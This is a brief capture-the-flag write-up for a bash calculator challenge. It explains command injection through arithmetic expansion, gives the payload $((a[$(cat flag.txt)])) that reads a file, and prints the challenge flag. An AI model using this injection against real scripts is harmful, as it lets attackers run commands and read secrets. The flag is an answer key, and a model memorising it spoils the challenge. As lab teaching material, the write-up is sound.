# blind-calc

- Category: mainstream,bash,introductory
- Description: calculator using arithmetic expansion in bash

### Solution:

1. Command-injection inside `$((..))`
2. Payload for injection is `$((a[$(cat flag.txt)]))`

Flag: `jail{blind-calc_9c701e8c09f6cc0edd6}`

**References:** [https://book.jorianwoltjer.com/linux/linux-privilege-escalation/command-exploitation#injecting-commands-in-math](https://book.jorianwoltjer.com/linux/linux-privilege-escalation/command-exploitation#injecting-commands-in-math)




